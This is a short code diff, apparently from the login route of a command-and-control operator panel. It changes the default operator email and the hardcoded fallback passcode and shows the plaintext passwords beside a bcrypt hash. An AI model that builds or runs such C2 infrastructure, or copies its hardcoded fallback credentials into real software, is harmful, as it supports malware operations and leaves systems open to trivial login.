@@ -32,8 +32,8 @@ const db = {
   findUserByEmail: async (email) => {
     return {
       id: 'operator_c2',
-      email: email || 'operator@labrats.c2',
-      // Hash for default passcode 'admin1337'
+      email: email || 'admin@jaybi.uz',
+      // Hash for default passcode 'Fly.admin1337'
       passwordHash: process.env.PASSWORD_HASH || '$2b$10$w4r2sIkgqT13J1tF1S/T7eK3N9o0e3Q6aY7z0d9E7f8g9h0i1j2k'
     };
   },
@@ -65,7 +65,7 @@ router.post('/login', loginLimiter, async (req, res) => {
   if (!password && req.body && req.body.p) password = req.body.p;
   password = deobfuscatePass(password);
 
-  const C2_PASS = process.env.C2_PASSWORD || 'admin1337';
+  const C2_PASS = process.env.C2_PASSWORD || 'Fly.admin1337';
   const user = await db.findUserByEmail(email);
 
   // Always run bcrypt.compare to prevent timing attacks even if user doesn't exist
